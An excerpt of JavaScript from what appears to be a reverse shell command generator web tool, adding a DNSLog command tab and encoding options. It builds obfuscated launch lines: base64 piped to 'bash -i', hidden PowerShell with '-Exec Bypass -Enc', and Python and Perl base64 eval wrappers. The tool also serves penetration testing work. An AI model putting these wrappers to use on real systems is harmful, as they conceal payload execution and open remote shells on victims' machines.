...
const DNSLogCommand = document.querySelector("#dnslog-command");
...
document.querySelector("#dnslog-tab").addEventListener("click", () => {
    document.querySelector("#dnslog-selection").innerHTML = "";
    rsg.setState({
        commandType: CommandType.DNSLog,
        encoding: "None"
    });
});
...
const rsg = {
    ...
    selectedValues: {
        ...
        [CommandType.DNSLog]: filterCommandData(rsgData.reverseShellCommands, { commandType: CommandType.DNSLog })[0].name
    },
    commandType: CommandType.ReverseShell,
    ...
    uiElements: {
        ...
        [CommandType.DNSLog]: {
            listSelection: '#dnslog-selection',
            command: '#dnslog-command'
        }
    },
    ...
    generateReverseShellCommand: () => {
        ...
        function encoder(string) {
            ...
            switch (encoding) {
                case 'encodeURLDouble':
                    urlresult = fixedEncodeURIComponent(urlresult);
                // fall-through
                case 'encodeURL':
                    urlresult = fixedEncodeURIComponent(urlresult);
                    break;
        ...
        switch (encoding) {
            case 'Bash-1':
                ...
                command = 'echo ' + btoa(command) + '|base64 -d|bash -i';
                break;
            case 'Bash-2':
                command = rsg.insertParameters(command, (text) => text)
                command = 'bash -c {echo,' + btoa(command) + '}|{base64,-d}|{bash,-i}';
                break;
            case 'PowerShell':
                command = rsg.insertParameters(command, (text) => text)
                let poshInput = ''
                for (let i = 0; i < command.length; i++) {
                    poshInput += command[i] + unescape("%00");
                }
                command = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
                break;
            case 'Python':
                command = rsg.insertParameters(command, (text) => text)
                command = "python -c exec('" + btoa(command) + "'.decode('base64'))";
                break;
            case 'Perl':
                command = rsg.insertParameters(command, (text) => text)
                command = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(command) + "'))";
                break;
            case 'Base64':
                command = rsg.insertParameters(command, (text) => text)
...
document.querySelector('#copy-dnslog-command').addEventListener('click', () => {
    rsg.copyToClipboard(DNSLogCommand.innerText)
})
